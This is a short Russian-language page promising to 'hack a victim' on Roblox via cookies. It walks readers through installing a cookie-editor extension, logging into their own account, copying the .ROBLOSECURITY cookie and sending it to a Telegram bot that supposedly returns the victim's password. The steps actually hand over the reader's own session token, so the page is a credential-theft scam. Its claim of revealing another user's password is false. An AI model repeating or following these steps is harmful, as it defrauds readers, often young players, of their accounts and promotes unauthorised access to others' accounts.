Как взломать жертву по куки

Если вы с телефона:

Первый шаг

Сначала нужно скачать с / qiwi browser Для Android и orion для IOS

Для qiwi browser(android)

Нажимаем на кнопку снизу чтоб скопировать ссылку

Копировать ссылку

Заходим в браузер и вписываем скопирываную ссылку

Далее переходем по первой ссылке и нажимаем добавить в chrome

Дальше заходим в роблокс и ищем профиль того кого вы хотите взломать

Потом нажимаем 3 точки пролистываем в открывшемся меню вниз и нажимаем cookie editor (возле надписи значек печеньки)

выбираем там Roblox Security копируем и переходим в бот телеграм по кнопку снизу

перейти в бот

отправляем боту скопирыванное значение ждем пока бот выдаст вам пароль и ник

Способ для пк (работает только в браузере Chrome)

1. Заходим на этот сайт с компьютера

2.нажимаем на кнопку снизу

Скачать разширение

3.Устанавливаем разширение

4. переходим на роблокс сайт входим в свой аккаунт если вы не сделали это раньше и ищем жертву, переходим в профиль жертвы.

5. нажимаем на значок пазла сверху справа возле поисковой строки ищем cookie editor и нажимаем

6. выбираем там Roblox Security копируем и переходим в бот телеграм по кнопку снизу

перейти в бот

отправляем боту скопирыванное значение ждем пока бот выдаст вам пароль и ник
